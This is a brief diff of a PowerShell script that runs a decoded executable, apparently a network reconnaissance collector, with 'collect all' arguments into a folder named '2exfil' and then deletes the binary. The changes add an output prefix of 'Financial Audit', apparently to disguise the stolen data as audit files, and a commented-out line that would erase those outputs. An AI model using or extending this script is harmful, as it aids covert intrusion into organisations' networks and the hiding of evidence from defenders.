@@ -18,7 +18,7 @@ $executablePath = "$env:TEMP\decoded_executable.exe"
 $outputDirectory = "C:\temp\2exfil"    # Outputting to specific directoy
 
 # Define the arguments required by the executable
-$arguments = "-c All --outputdirectory $outputDirectory"
+$arguments = "-c All --outputdirectory $outputDirectory --OutputPrefix ""Financial Audit"""
 
 # Reflectively load and execute the executable with the arguments
 # Note: This approach uses the "Run" method to execute the executable
@@ -29,3 +29,6 @@ $process.WaitForExit()
 
 # Clean up by deleting the executable file
 Remove-Item -Path $executablePath
+
+# Clean output files
+#Remove-Item -Path "C:\temp\2exfil\Financial Audit*"
